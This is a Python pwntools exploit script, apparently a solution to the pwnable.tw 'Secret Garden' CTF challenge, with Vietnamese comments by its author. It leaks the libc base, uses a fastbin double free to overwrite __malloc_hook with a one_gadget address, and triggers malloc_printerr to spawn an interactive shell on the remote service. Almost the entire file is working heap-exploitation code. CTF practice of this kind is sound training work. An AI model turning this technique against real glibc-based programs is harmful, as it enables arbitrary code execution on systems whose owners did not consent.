#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("secretgarden_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *realloc
b *__malloc_hook
# breakrva 0xCD3
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10203
        return remote(host, port)

p = conn()

def raise_flower(size, name, color):
    slan(p, b'choice', 1)
    slan(p, b'Length', size)
    sa(p, b'name of flower', name)
    sleep(0.01)
    slan(p, b'color', color)

def visit_garden():
    slan(p, b'choice', 2)

def remove_flower(index):
    slan(p, b'choice', 3)
    slan(p, b'remove', index)

def clean_garden():
    slan(p, b'choice', 4)

'''
DOC KY CODE HON,
DOC DUNG CODE HON, HIEU NHAM CON TRO, GIA TRI LA KO RA DC BUG
BOT ASSUME LAI, NHIN VAO CODE DANG THUC SU LAM GI, DUNG NHIN VAO "Y TUONG CUA CODE"
CO NHIEU LOI RAT SUBTLE, CHECK KY CANG PLS


Key Points
Before glibc 2.32:

malloc and malloc_consolidate don't care about alignment when taking chunks from fastbins
​

Only free() checks alignment (16-byte on 64-bit)
​

This means for fastbin poisoning attacks, your fake chunk address doesn't need to be aligned

Starting glibc 2.32 (Safe-Linking):

Explicit alignment checks were added: if (__glibc_unlikely (!aligned_OK (p)))

Multiple checks during fastbin operations will catch misaligned chunks
​

These checks cause malloc_printerr if alignment is violated
'''

raise_flower(0x410, b'A', b'A') # 0
raise_flower(0x60, b'A', b'A') # 1
raise_flower(0x60, b'A', b'A') # 2
raise_flower(0x60, b'A', b'A') # 3

remove_flower(0)
clean_garden()
raise_flower(0x410, b'A', b'A') # 0

visit_garden()

ru(p, b'flower[0] :')
libc.address = leak_bytes(rn(p, 6), 0x3c3b41)
lg("libc base", libc.address)

remove_flower(1)
remove_flower(2)
remove_flower(1)

malloc_hook = libc.symbols['__malloc_hook']
lg("malloc hook", malloc_hook)
raise_flower(0x60, p64(malloc_hook - 0x23), b'A')

raise_flower(0x60, b'A', b'A')
raise_flower(0x60, b'A', b'A')

one_gadget = libc.address + 0xef6c4
lg("one gadget", one_gadget)

# O DAY DINH GHI DE REALLOC DE THOA MAN ONE_GADGET NHUNG MA KO DC, NEN KICH HOAT MALLOC PRINTERR DE GOI MALLOC, STACK SACH HON
raise_flower(0x60, pad(0x13) + p64(one_gadget), b'A')

# Triggering malloc printerr
remove_flower(3)
remove_flower(3)

ia(p)